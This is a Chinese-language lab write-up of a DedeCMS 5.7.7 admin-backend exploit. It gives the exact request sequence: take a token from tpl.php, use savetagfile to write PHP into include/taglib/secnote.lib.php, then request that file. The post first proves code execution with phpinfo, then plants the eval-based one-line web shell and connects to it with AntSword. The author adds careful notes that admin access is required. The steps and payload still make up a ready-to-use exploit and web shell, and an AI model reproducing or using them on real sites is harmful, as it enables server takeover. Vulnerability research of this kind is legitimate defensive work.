ailx10说：这篇是2024年8月之前写的，后来又改过。这一篇仍从织梦管理员后台操作，先在模板相关入口取 token，再把内容保存到 taglib 文件，最后单独访问它，才出现后面的执行和连接。过程短，但准备请求、写入和触发并不是同一步，漏掉最后访问就只剩一份文件。我把它们按顺序写下来，方便以后重看时不把 token 当成绕过登录的钥匙。标题和实际测试版本也留着差别：这份记录证明的是那次环境中的结果，而不是凭一个相近名称就覆盖了所有版本。

DedeCMS5.7.7管理员从模板上传入口取token，savetagfile把PHP写include/taglib/\*.lib.php，随后直接访问并连接。

核查提示：标题SP2与实测5.7.7一并记录；两次GET是准备写入还需第三次访问，token不是绕过管理员认证。 原实验和代码未重新运行，图内细节有待核验。

本文记录 DedeCMS 5.7.7 管理员后台的历史实验。前两次请求用于准备和写入文件，后续仍需访问目标文件才观察到执行；token 不是管理员认证绕过。

（1）登录后台，访问URL，从HTTP响应内容中找到token值

```
http://192.168.0.109/dede/tpl.php?action=upload
```

![](/notes-assets/e6322fd7304fc5499a01.webp)

（2）构造POC请求，content值是`<?php phpinfo();?>`，token值是上面HTTP响应得到的

```
http://192.168.0.109/dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token=127130958873203299630a09ddcf14de
```

GET请求返回内容如下，不要点确认

![](/notes-assets/b7dfea9221b01c5904f7.webp)

（3）访问URL，触发代码执行

```
http://192.168.0.109/include/taglib/secnote.lib.php
```

![](/notes-assets/be5e8960d5ea2f994b67.webp)

查看文件 `include/taglib/secnote.lib.php` 内容 ，是POC请求中content的值

![](/notes-assets/3ff605de0bd5f0ab908f.webp)

（4）准备一句话木马，重复步骤2，构造POC请求

```
<?php @eval($_POST['x']); ?>
```

![](/notes-assets/44d5502188ddcf6a6f66.webp)

（5）蚁剑连接，getshell 成功

```
http://192.168.0.109/include/taglib/secnote.lib.php
```

![](/notes-assets/d7b32cde7e2a7cceab8c.webp)

![](/notes-assets/3440ed249539999944da.webp)

这次记录最该保留的是权限和请求次序。token并没有凭空绕过管理员认证，写下一个文件也不等于它已经被执行；把这些条件放回去，实验才不会显得比实际更简单。
